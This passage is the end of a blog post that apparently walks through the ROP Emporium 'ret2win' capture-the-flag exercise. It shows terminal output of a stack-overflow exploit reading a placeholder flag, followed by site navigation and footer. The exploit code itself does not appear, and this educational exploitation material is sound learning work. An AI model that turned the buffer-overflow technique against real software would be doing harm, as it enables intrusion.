+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:~/ROP-Emporium$ python ret2win.py
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./ret2win&#39;</span>: pid <span class="m">9089</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./ret2win&#39;</span> <span class="o">(</span>pid 9089<span class="o">)</span>
+</span></span><span class="line"><span class="cl">robin@oracle:~/ROP-Emporium$ ./ret2win &lt; payload
+</span></span><span class="line"><span class="cl">ret2win by ROP Emporium
+</span></span><span class="line"><span class="cl">64bits
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">For my first trick, I will attempt to fit <span class="m">50</span> bytes of user input into <span class="m">32</span> bytes of stack buffer<span class="p">;</span>
+</span></span><span class="line"><span class="cl">What could possibly go wrong?
+</span></span><span class="line"><span class="cl">You there madam, may I have your input please? And don<span class="s1">&#39;t worry about null bytes, we&#39;</span>re using fgets!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
+</span></span></code></pre></div><p>Bam, we read the flag by pushing the <code>pop rbp</code> address to RIP hence executing our payload.</p>
+<p>Follow me on <a href="https://twitter.com/d4mianwayne" target="_blank" rel="noreferrer">twitter</a> for more ROP contents.</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/rop-introduction/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Introduction to ROP</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-07-24 00:00:00 &#43;0000 UTC">24 July 2019</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/ret2libc-pwntools/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ROP - ret2libc attack</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-07-29 00:00:00 &#43;0000 UTC">29 July 2019</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
